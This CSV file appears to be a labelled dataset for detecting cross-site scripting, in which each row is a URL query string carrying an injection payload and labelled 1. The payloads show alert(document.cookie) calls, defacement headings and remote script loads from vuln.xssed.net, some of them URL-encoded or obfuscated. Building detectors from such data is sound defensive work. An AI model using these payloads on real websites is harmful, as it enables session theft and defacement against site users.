Payload,Label
"id=""><script>alert(""Ownz+Your+System+By+Vagrant"")</scr<br/>ipt>",1
"orc=""><script>alert(""Ownz+Your+System+By+V<br/>agrant"")</script>",1
view=summary&time_frame=10&year=2007&month=03&<br/>day=12&hour=4&minute=14&limitNumber=''></script><script>alert(document.cookie)</script>''><h1>djseda<br/>t%20Narcoticxs</h1>,1
target=%22%3EGURUS+Here%3Cscript%3Ealert%28%27Ownz+Your+System<br/>+By+Vagrant%27%29%3C%2Fscript%3E,1
palavra=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.x<br/>ssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&Submit=Ok,1
ID=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xsse<br/>d.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
search=malioglasi&oblast=''></script><script>a<br/>lert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
q=cfm&start=''></script><script>alert(document.cookie)</script><br/>''><h1>djsedat</h1>,1
f_f_form_submitted=1&f_search=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp<br/>%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E,1
FRMcidprocura3=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xsse<br/>d.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E,1
"Title=""><script>alert(""Ownz+Your+System+By+Vagrant"")</script>",1
"sSearch=""><script>alert(""MaXWeL"")</script>",1
"CodiceCollana=""><script>alert(""MaXWeL"")</script>",1
q=lavoro&n=''></script><script>alert(document.cookie)</script><br/>''><h1>djsedat%20Narcoticxs</h1>,1
name=''></script><script>alert(document.cookie)</script>''><h1>dj<br/>sedat%20Narcoticxs</h1>,1
"gender=""><script>alert(""MaXWeL"")</scrip<br/>t>",1
"startpage=""><script>alert(""MaXWeL"")</script>",1
query=''></script><script>alert(document.cookie)</script>''><h1>djsed<br/>at%20Narcoticxs</h1>,1
"session_id=""><script>alert(""MaX<br/>WeL"")</script>",1
texto=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthird<br/>party%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E,1
materia_id=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.ne<br/>t/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
menu=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thir<br/>dparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"htext=""><script>alert(""MaXWeL"")</script>",1
"id=""><script>alert(""MaXWeL"")</scrip<br/>t>",1
"IDImovel=""><script>alert(""MaXWeL<br/>"")</script>",1
"RUBRIC=""><script>alert(""MaXWeL"")</script>",1
site=''></script><script>alert(document.cookie)</script>''><<br/>h1>djsedat%20Narcoticxs</h1>,1
i=4279&ex1=''></script><script>alert(document.cookie)</script>''><h<br/>1>djsedat%20Narcoticxs</h1>,1
busca=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdpar<br/>ty/scripts/python5.js%3E%3C/SCRIPT%3E,1
country=&start=195&lang=&entry=missouri+adoption&sites='<br/>'></script><script>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
FAQCat_Id=''><script>alert('Narcoticxs')</script>,1
pg=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/<br/>thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"Session=""><script>alert(""MaXWeL"")</script>",1
Data=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthird<br/>party%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E,1
"&amp;print=""><script>alert(""MaXWeL"")</script>",1
skin=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdparty<br/>/scripts/python5.js%3E%3C/SCRIPT%3E,1
busca=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fv<br/>uln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E,1
"line=""><script>alert(""MaXWeL"")</script>",1
option=com_content&task=view&id=730&Itemid=%22%3E'%3E%3CSCRIPT%<br/>20SRC=http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E0,1
"nft=""><script>alert(""MaXWeL"")</script>",1
"tcol=""><script>alert(""MaXWeL<br/>"")</script>",1
"printmode=""><script>alert(""MaXWeL"")</s<br/>cript>",1
"RestID=""><script>alert(""MaXWeL"")</script>",1
"objid=""><scr<br/>ipt>alert(""MaXWeL"")</script>",1
"Subject=""><script>alert(""MaXWeL"")</sc<br/>ript>",1
"faqcat_id=""><script>alert(""MaXWeL"")</s<br/>cript>",1
ptheme1=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/th<br/>irdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
start=10&q=''></script><script>alert(document.cookie)</script>'><h<br/>1>HACKEDNARCOTICXS</h1>,1
country=''></script><script>alert('djsedat')</script>,1
what=yf&search_word=''></script><script>alert(document.cookie)</scrip<br/>t>,1
milieu=/fr/actus/milieu.htm&page=http://vuln<br/>.xssed.net/thirdparty/scripts/python5.html,1
action=thread&id=204659&start=''></script><script>alert(documen<br/>t.cookie)</script>'><h1>HACKEDNARCOTICXS</h1>,1
islem_turu=''><script>alert('Narcoticxs')</script>'<br/>><h1>HACKED</h1>,1
k=''><script>alert('Narcoticxs')</script>,1
Query=%22%3E%3Cscript%3Ealert(document.cookie)%3<br/>C/script%3Edsadsa&target=blendedsearch&first-page-size=5&x=0&y=0,1
search_string=''></script><script>alert(document.cookie)</script>,1
recherche=%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRI<br/>PT%3Ealert%28String.fromCharCode%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%3<br/>C%2FSCRIPT%3E%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E&rechercher=Ok&rub1=Actualit%E9s&rub2=Aides+Eur<br/>op%E9ennes&rub3=Si+j%27avais+un+projet&rub4=C%27est+moi+qui+l%27ai+fait&rub5=Ressources&rub7=Informa<br/>tions&recherche_debut=&recherche_fin=&forced_rub=,1
"invoice=""><script>alert(""MaXWeL"")</script>",1
infoid=''><script>alert('Narcoticxs')</script>''><h1>djsedat</h<br/>1>,1
ara=''></script><script>alert(document.cookie)</script>''><h1>narcot<br/>icxs</h1>,1
aramaturu=''><script>alert('Narcoticxs')</script>,1
noregion=%22%3E'<br/>%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
m=&p=&v=&t=&g=0&REC=%22%3E%2<br/>7%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3<br/>E,1
redirect=/compendium/zoom-f.asp?id=%22%3E%3Cscript%3Ealer<br/>t(%22MaXWeL%22)%3C/script%3E|60|800a0d5d|Application_uses_a_value_of_the_wrong_type_for_the_current_<br/>operation.,1
nbi=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.n<br/>et/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
REQ=''></script><script>alert(document.cookie)</script<br/>>''><h1>djsedat%20Narcoticxs</h1>,1
arama=''><script>alert('Narcoticxs')</script>,1
site=0101328&group=''></script><script>alert(do<br/>cument.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
"signaler_page=""><script>alert(/MaXWeL/)</script>",1
Yeni=1&L=1&KD=''><script>alert('Narcoticxs')</script>,1
